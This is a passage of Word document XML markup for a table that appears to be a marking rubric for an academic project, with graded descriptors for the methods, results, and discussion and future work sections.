          <w:p w14:paraId="4F34A071" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30FBFC5F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Excellently describes methods to be used. Critically describes testing and validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E0DA2E0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Very good description of methods to be used. Some critical description of testing and validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C2E4775" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Good description of methods to be used. Describes some testing and validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16785CC7" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Satisfactory description of methods to be used. Satisfactory outline of testing and validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="228BE8C8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Unsatisfactory description of methods to be used. Little information on testing and/or validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C6DF3C1" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Little information on methods to be used. No testing and/or validation of methods.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="584695C0" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="1380"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D644431" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Results</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A98DF20" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75B48180" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Excellent presentation of results. Formatted in superior style and easy to decipher. Excellent analyses of results </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>in light of</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> Project Aim, Background and Context. Detailed and reflective.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28D8F227" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Very good presentation of results. Formatted in appropriate style and mostly easy to decipher. Very good analyses of results </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>in light of</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> Project Aim, Background and Context.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25CE9650" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Good presentation of results. Good analyses of results </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>in light of</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> Project Aim, Background and Context.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0169543B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Satisfactory presentation of results. Satisfactory analyses of results </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>in light of</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> Project Aim, Background and Context.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40D114C1" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Few results presented. Very poor analyses of results with no references to Project Aim, Background and Context.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3016083B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Missing results. No analyses of results with no references to Project Aim, Background and Context.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26EBCA2F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="15158" w:type="dxa"/>
        <w:tblInd w:w="118" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1519"/>
        <w:gridCol w:w="801"/>
        <w:gridCol w:w="2065"/>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2529"/>
        <w:gridCol w:w="2240"/>
        <w:gridCol w:w="1893"/>
        <w:gridCol w:w="1985"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="5C818D05" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="1185"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EB821F9" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Discussion and Future Work</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38FC3070" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
